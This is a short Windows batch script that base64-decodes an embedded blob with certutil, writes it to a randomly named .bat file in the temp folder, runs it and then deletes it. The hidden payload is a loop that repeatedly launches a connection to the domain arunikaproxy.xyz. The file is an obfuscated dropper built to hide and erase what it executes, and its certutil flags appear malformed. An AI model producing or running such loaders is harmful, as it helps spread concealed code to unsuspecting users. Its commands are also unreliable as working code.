@echo off
set "encrypted=QGVjaG8gb2ZmCkEgCnN0YXJ0IGllaXByb2xlIGFydW5pa2Fwcm94eS54eXoKZ290bztBOgoKcmVtIGRlY3J5cHRpb24ga2V5CmVjaG8gJ3lvdXJfY3VzdG9tX2VuY3J5cHRpb25fa2V5Jw=="
set "encrypted_key=6qTjuU8dFy5/g2o0Q1+p1/gqpzph8+4vE+jiWyt+OnM="
for /f "delims=" %%i in ('certutil -decodehex -f -k "%encrypted_key%" ^| findstr /v "^$"') do set "key=%%i"
echo %encrypted% | certutil -decode -f -k "%key%" "%temp%\zmjKK.bat" >nul
call "%temp%\zmjKK.bat"
del "%temp%\zmjKK.bat"
